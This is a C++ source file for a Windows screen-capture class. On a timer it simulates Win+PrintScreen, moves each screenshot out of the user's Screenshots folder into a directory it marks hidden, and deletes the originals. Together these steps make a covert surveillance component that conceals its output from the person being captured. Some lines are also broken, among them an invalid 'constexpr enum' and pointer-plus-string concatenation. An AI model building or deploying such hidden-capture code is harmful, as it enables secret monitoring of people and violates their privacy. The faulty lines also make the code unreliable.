#pragma once

#include "ScreenCapture.hpp"
#include "PublicFunctions.hpp"
#include <windows.h>
#include <filesystem>
#include <string>
#include <fstream>
#include <expected>
#include <userenv.h>
#include <thread>

namespace fs = std::filesystem;

constexpr enum STATUS_CODES
{
    Success,
    ErrorInvalid
};

ScreenCapture::ScreenCapture()
{
    SetDefaultDirectory();
}

ScreenCapture::ScreenCapture(ScreenCapture& screenCapture)
{
    SetDirectory(screenCapture.directory.c_str());
}

ScreenCapture::ScreenCapture(const char* directory)
{
    SetDirectory(directory);
}

void ScreenCapture::SetDefaultDirectory()
{
    std::string currentPath = fs::current_path().string();
    directory = currentPath + FOLDER_NAME;
    CreateScreenshotFolder();
}

int ScreenCapture::SetDirectory(const char* directory)
{
    struct stat st;
    if (stat(directory, &st) == 0) {
        this->directory = directory + FOLDER_NAME;
        if (CreateScreenshotFolder() == 0 || stat(directory, &st) == 0) {
            return STATUS_CODES(Success);
        }
    }
    SetDefaultDirectory();
    return STATUS_CODES(ErrorInvalid);
}

std::string ScreenCapture::GetUserDirectory()
{
    WCHAR* buffer = new WCHAR[260];
    const WCHAR name[12] = L"USERPROFILE";
    DWORD result = GetEnvironmentVariable(name, buffer, 260);
    if (result > 260) {
        delete[] buffer; buffer = new WCHAR[result];
        GetEnvironmentVariable(name, buffer, result);
    }
    std::wstring temp = buffer;
    return PublicFunctions::WStringToString(temp);
}

int ScreenCapture::CreateScreenshotFolder()
{
    struct stat sb;
    if (fs::create_directory(directory) || stat(directory.c_str(), &sb) == 0) 
    {
        std::wstring fileLPCWSTR = PublicFunctions::StringToWString(directory);
        int attributes = GetFileAttributes(fileLPCWSTR.c_str());
        if (SetFileAttributes(fileLPCWSTR.c_str(), attributes | FILE_ATTRIBUTE_HIDDEN) != 0)
        { 
            return STATUS_CODES(Success);
        }
    }
    return STATUS_CODES(ErrorInvalid);
}

void ScreenCapture::CreateScreenShot()
{
    keybd_event(VK_RWIN, 0, 0, 0);
    keybd_event(VK_SNAPSHOT, 0, 0, 0);

    keybd_event(VK_RWIN, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0);
}

std::string ScreenCapture::CreateFileName()
{
    std::chrono::system_clock::time_point currentTime = std::chrono::system_clock::now();
    std::time_t time = std::chrono::system_clock::to_time_t(currentTime);
    char timeString[26];
    ctime_s(timeString, sizeof(timeString), &time);
    for (size_t i = 0; i < sizeof(timeString); i++)
    {
        if (timeString[i] == ' ')
        {
            timeString[i] = '_';
        }
        else if (timeString[i] == ':')
        {
            timeString[i] = '-';
        }
    }
    std::string fileName = timeString;
    fileName = fileName.substr(0, fileName.length() - 1) + ".png";
    return fileName;
}

void ScreenCapture::TakeScreenShot()
{
    CreateScreenShot();
    std::this_thread::sleep_for(std::chrono::milliseconds(200));
    std::string folderDirectory = GetUserDirectory() + SCREENSHOT_FOLDER;
    std::string fileName = PublicFunctions::GetLastCreatedFile(folderDirectory);
    std::string newFileName = CreateFileName();
    fs::rename(fileName, folderDirectory + newFileName);
    fs::copy(folderDirectory + newFileName, directory);
    fs::remove(fileName);
    fs::remove((folderDirectory + newFileName));
}

void ScreenCapture::StartScreenCaptureThread(uint32_t interval)
{
    while (captureState)
    {
        TakeScreenShot();
        std::this_thread::sleep_for(std::chrono::milliseconds(interval * 1000));
    }
}

std::thread ScreenCapture::StartScreenCapture(uint32_t interval)
{
    std::thread thread_ScreenCapture(&ScreenCapture::StartScreenCaptureThread, this, interval);
    return thread_ScreenCapture;
}

void ScreenCapture::StopScreenCapture()
{
    captureState = false;
}
